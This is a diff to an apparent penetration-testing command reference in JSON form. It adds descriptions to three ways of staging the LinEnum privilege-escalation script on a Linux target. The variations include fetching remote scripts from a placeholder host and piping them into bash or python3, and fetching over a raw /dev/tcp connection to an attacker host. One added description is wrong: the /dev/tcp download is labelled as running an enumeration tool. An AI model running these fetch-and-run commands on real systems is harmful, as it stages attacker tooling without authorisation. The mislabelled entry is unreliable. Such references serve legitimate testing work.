@@ -66,15 +66,18 @@
   "variations": [
     {
       "label": "wget / curl to disk",
-      "command": "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh\ncurl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"
+      "command": "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh\ncurl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh",
+      "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
     },
     {
       "label": "Fileless (pipe to interpreter)",
-      "command": "curl https://<ip>/LinEnum.sh | bash\nwget -qO- https://<ip>/helloworld.py | python3"
+      "command": "curl https://<ip>/LinEnum.sh | bash\nwget -qO- https://<ip>/helloworld.py | python3",
+      "description": "Downloads a file or script from a remote URL. Used for staging tools, payloads, or second-stage code on the target."
     },
     {
       "label": "bash /dev/tcp (no wget/curl)",
-      "command": "exec 3<>/dev/tcp/<lhost>/80\necho -e \"GET /LinEnum.sh HTTP/1.1\\n\\n\">&3\ncat <&3"
+      "command": "exec 3<>/dev/tcp/<lhost>/80\necho -e \"GET /LinEnum.sh HTTP/1.1\\n\\n\">&3\ncat <&3",
+      "description": "Runs an automated privilege escalation enumeration tool. Checks for common misconfigurations and privesc vectors."
     }
   ],
   "opsec": "quiet",
